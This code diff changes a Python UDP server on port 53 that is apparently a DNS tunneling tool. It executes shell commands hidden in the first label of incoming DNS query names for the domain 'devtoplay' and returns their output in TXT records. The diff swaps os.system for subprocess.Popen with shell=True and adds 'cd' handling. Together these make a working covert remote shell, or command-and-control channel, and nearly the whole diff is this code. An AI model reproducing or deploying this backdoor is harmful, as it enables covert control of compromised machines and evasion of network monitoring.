@@ -3,17 +3,8 @@
 import sys
 import os
 import socket
+import subprocess
 from message import *
-
-
-def calculator(op):
-    print(op, op[0])
-    r = 0
-    
-    if(op[0] == int("ad", 16)):
-        r  = op[1] + op[2]
-    
-    return r.to_bytes(1,'big')
 
 serversocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
@@ -24,6 +15,8 @@ else:
     serversocket.bind(("127.0.0.1",53))
 
 last = ""
+res = b'\x01\x01\x01\x01'
+
 while True:
     data, ad = serversocket.recvfrom(4096)
     print(data)
@@ -32,8 +25,6 @@ while True:
     print(q)
     print(q.rrList[0].rdata)
     
-    res = b'\x01\x01\x01\x01'
-        
     cmd = q.qList[0].qname.split(".")
 
     if(cmd[0] != "devtoplay"):
@@ -43,11 +34,21 @@ while True:
             while(cmd[0][i] >= "0" and cmd[0][i] <= "9"):
                 i += 1
             print(cmd[0],last)
-            os.system(cmd[0][i:] + " 1> ~/dns_tuneling/src/out 2> ~/dns_tuneling/src/out")
-            
-        f = open("out", "r")
-        res = str.encode(f.read())
-        f.close()
+
+            if("cd" in cmd[0][i:]):
+                os.chdir(cmd[0][i+3:])
+                res=b''
+            else:
+                p = subprocess.Popen(cmd[0][i:], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+                res,err = p.communicate()
+
+                if(res is None or res == b''):
+                    res = err
+
+                if(res is None):
+                    res = b''
+                    
+                print(res)
             
     message = Message(Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 0, 0, 1), q.qList, [RR(q.qList[0].qname,res, 16, 1, 1)])
 
